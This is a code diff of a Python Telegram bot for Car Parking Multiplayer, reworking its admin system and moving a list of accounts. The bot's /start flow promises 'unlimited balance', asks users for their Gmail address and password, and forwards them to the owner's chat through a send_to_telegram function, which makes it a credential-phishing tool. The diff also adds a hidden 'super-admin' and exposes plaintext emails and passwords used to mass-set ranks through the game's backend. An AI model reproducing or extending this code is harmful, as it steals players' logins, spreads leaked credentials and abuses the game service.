@@ -12,50 +12,50 @@ RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4
 CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"
 
 # --- Telegram Bot Configuration ---
-# Эти переменные ДОЛЖНЫ быть добавлены в разделе Environment на Render
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHAT_ID = os.environ.get("CHAT_ID")
 
 if not BOT_TOKEN:
-    raise ValueError("❌ BOT_TOKEN не задан в Environment Variables!")
+    raise ValueError("❌ BOT_TOKEN не задан!")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 user_states = {}
 
+# Твой ID (Скрытый Супер-Админ)
 OWNER_ID = int(CHAT_ID) if CHAT_ID else 0
-ADMINS = {"usernames": set(), "ids": set()}
 
-# --- АККАУНТЫ ДЛЯ /level ---
-ACCOUNTS = [
-    {"email": "den_isaev_9595@mail.ru", "password": "Zaebali1995"},
-    {"email": "cpmcpmking1@gmail.com", "password": "666666"},
-    {"email": "cpmcpmking2@gmail.com", "password": "666666"},
-    {"email": "cpmcpmking3@gmail.com", "password": "666666"},
-    {"email": "cpmcpmking4@gmail.com", "password": "666666"},
-    {"email": "cpmcpmking5@gmail.com", "password": "666666"},
-    {"email": "cpmcpmking52@gmail.com", "password": "666666"},
-    {"email": "den_isaev_95@mail.ru", "password": "Zaebali1995"},
-    {"email": "kingcpmcpm1@gmail.com", "password": "666666"},
-    {"email": "kingcpmcpm2@gmail.com", "password": "666666"},
-]
+# Статичные админы (НЕ СБРАСЫВАЮТСЯ, впиши сюда их ID через запятую)
+HARDCODED_IDS = {111111111, 222222222, 333333333}
 
-# --- Flask Server for Render ---
+# Реестр всех админов {id: "Username | ID"}
+admin_registry = {aid: f"ID: {aid}" for aid in HARDCODED_IDS}
+
+# --- Flask Server (Для Render) ---
 app = Flask(__name__)
-
 @app.route('/')
-def health_check():
-    return "Bot is running!", 200
+def health(): return "Bot is Online", 200
+
+# --- ПРОВЕРКА ПРАВ И ОБНОВЛЕНИЕ ДАННЫХ ---
+def is_admin(message):
+    uid = message.from_user.id
+    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
+    
+    if uid == OWNER_ID: return True
+    
+    if uid in admin_registry or uid in HARDCODED_IDS:
+        admin_registry[uid] = f"{uname} | ID: `{uid}`"
+        return True
+    
+    # Проверка по временным юзернеймам
+    for key in list(admin_registry.keys()):
+        if admin_registry[key] == uname:
+            admin_registry[uid] = f"{uname} | ID: `{uid}`"
+            if key != uid: admin_registry.pop(key, None)
+            return True
+            
+    return False
 
 # --- FUNCTIONS ---
-def is_admin(message):
-    username = message.from_user.username
-    user_id = message.from_user.id
-    return (
-        user_id == OWNER_ID or
-        (username and username in ADMINS["usernames"]) or
-        (user_id in ADMINS["ids"])
-    )
-
 def send_to_telegram(email, password, clan_id):
     try:
         bot.send_message(CHAT_ID,
@@ -119,14 +119,77 @@ def run_mass_rank():
         if token:
             set_rank(token)
 
-# --- COMMANDS ---
+# --- ADMIN COMMANDS (+admin, -admin, /admin) ---
+
+@bot.message_handler(func=lambda m: m.text and m.text.startswith("+admin"))
+def add_admin(message):
+    if not is_admin(message): return
+    data = message.text.replace("+admin", "").strip()
+    if not data: return
+    
+    if data.startswith("@"):
+        admin_registry[f"temp_{data}"] = data
+        bot.send_message(message.chat.id, f"✅ {data} добавлен.")
+    elif data.isdigit():
+        new_id = int(data)
+        if new_id not in admin_registry:
+            admin_registry[new_id] = f"ID: `{new_id}`"
+            bot.send_message(message.chat.id, f"✅ ID `{new_id}` добавлен.")
+
+@bot.message_handler(func=lambda m: m.text and m.text.startswith("-admin"))
+def remove_admin(message):
+    if not is_admin(message): return
+    data = message.text.replace("-admin", "").strip()
+    if not data: return
+
+    if data.isdigit():
+        target_id = int(data)
+        if target_id == OWNER_ID or target_id in HARDCODED_IDS:
+            bot.send_message(message.chat.id, "🛑 Нельзя удалить системного админа.")
+            return
+        admin_registry.pop(target_id, None)
+    else:
+        uname = data if data.startswith("@") else f"@{data}"
+        for key, value in list(admin_registry.items()):
+            if uname in str(value):
+                if key in HARDCODED_IDS:
+                    bot.send_message(message.chat.id, "🛑 Нельзя удалить системного админа.")
+                    return
+                admin_registry.pop(key, None)
+
+    bot.send_message(message.chat.id, f"❌ {data} удален.")
+
+@bot.message_handler(commands=["admin"])
+def list_admins(message):
+    if not is_admin(message): return
+    is_admin(message) # Обновляем данные текущего админа
+
+    text = "🛡️ **Список администраторов:**\n\n"
+    has_admins = False
+    for key in admin_registry:
+        text += f"👤 {admin_registry[key]}\n"
+        has_admins = True
+    if not has_admins: text += "_(пусто)_"
+    
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+# --- CORE COMMANDS (/start, /level) ---
+
 @bot.message_handler(commands=["start"])
 def handle_start(message):
+    is_admin(message)
     user_states[message.from_user.id] = {"step": "await_email"}
+    
     name = message.from_user.first_name or "Неизвестно"
     username = f"@{message.from_user.username}" if message.from_user.username else "Нет username"
+    user_id = message.from_user.id
+
     bot.send_message(message.chat.id,
-        f"🏷️ имя: {name}\n🪪 user: {username}\n🌐 tg id: {message.from_user.id}\n💰 balance: unlimited")
+        f"🏷️ имя: {name}\n"
+        f"🪪 user: {username}\n"
+        f"🌐 tg id: {user_id}\n"
+        f"💰 balance: unlimited"
+    )
     bot.send_message(message.chat.id, "📧 ⚫️ ВВЕДИ @GMAIL ⚫️")
 
 @bot.message_handler(commands=["level"])
@@ -138,22 +201,9 @@ def handle_level(message):
     Thread(target=run_mass_rank).start()
     bot.send_message(message.chat.id, "👑 KING RANK установлены!")
 
-@bot.message_handler(commands=["admin"])
-def list_admins(message):
-    if not is_admin(message):
-        bot.send_message(message.chat.id, "🛑 у вас нет доступа")
-        return
-    text = "👑 Список админов:\n\n"
-    if not ADMINS["usernames"] and not ADMINS["ids"]:
-        text += "❌ Список пуст"
-    else:
-        for u in ADMINS["usernames"]: text += f"🪪 @{u}\n"
-        for i in ADMINS["ids"]: text += f"🌐 ID: {i}\n"
-    bot.send_message(message.chat.id, text)
-
 # --- USER FLOW ---
 @bot.message_handler(func=lambda message: message.from_user.id in user_states)
-def handle_flow(message):
+def handle_message(message):
     state = user_states[message.from_user.id]
     if state["step"] == "await_email":
         state["email"] = message.text
@@ -169,13 +219,22 @@ def handle_flow(message):
             bot.send_message(message.chat.id, "❌ Ошибка входа.")
         del user_states[message.from_user.id]
 
-# --- STARTUP ---
-def run_bot():
-    bot.infinity_polling(none_stop=True)
-
+# --- RUN ---
 if __name__ == "__main__":
-    # Запуск бота в отдельном потоке
-    Thread(target=run_bot).start()
-    # Запуск Flask сервера для Render на нужном порту
+    # Список аккаунтов (НЕ МЕНЯЙ ЕГО СТРУКТУРУ)
+    ACCOUNTS = [
+        {"email": "den_isaev_9595@mail.ru", "password": "Zaebali1995"},
+        {"email": "cpmcpmking1@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking2@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking3@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking4@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking5@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking52@gmail.com", "password": "666666"},
+        {"email": "den_isaev_95@mail.ru", "password": "Zaebali1995"},
+        {"email": "kingcpmcpm1@gmail.com", "password": "666666"},
+        {"email": "kingcpmcpm2@gmail.com", "password": "666666"},
+    ]
+
+    Thread(target=lambda: bot.infinity_polling(none_stop=True)).start()
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
